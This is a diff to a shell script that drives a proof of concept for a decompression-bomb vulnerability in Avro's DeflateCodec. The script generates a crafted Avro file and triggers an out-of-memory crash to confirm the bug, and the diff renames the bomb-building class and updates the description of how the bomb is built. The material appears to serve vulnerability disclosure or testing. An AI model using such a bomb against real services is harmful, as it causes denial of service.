@@ -70,10 +70,10 @@ echo
 JAR=/poc/poc.jar
 POC_FILE=/poc/poc.avro
 
-# ---- Step 1: create the bomb file ----
-echo "===== Step 1: Generating malicious Avro file ====="
+# ---- Step 1: create the crafted bomb file ----
+echo "===== Step 1: Generating crafted Avro bomb file ====="
 echo
-java -Xmx256m -cp "$JAR" poc.CreatePoC "$POC_FILE"
+java -Xmx256m -cp "$JAR" poc.CraftBomb "$POC_FILE"
 echo
 
 # ---- Step 2: trigger OOM ----
@@ -90,8 +90,9 @@ if [ $EXIT_CODE -eq 99 ]; then
     echo " RESULT: VULNERABILITY CONFIRMED (exit=99)"
     echo "============================================="
     echo
-    echo " A 49 KB Avro file decompressed to 50 MB,"
-    echo " crashing the JVM with OutOfMemoryError."
+    echo " A 50 KB Avro file with 8 innocent preamble"
+    echo " records decompressed to 50 MB on the 9th"
+    echo " record, crashing the JVM with OOM."
     echo
     echo " Root cause: DeflateCodec.decompress() writes"
     echo " to an unbounded ByteArrayOutputStream."
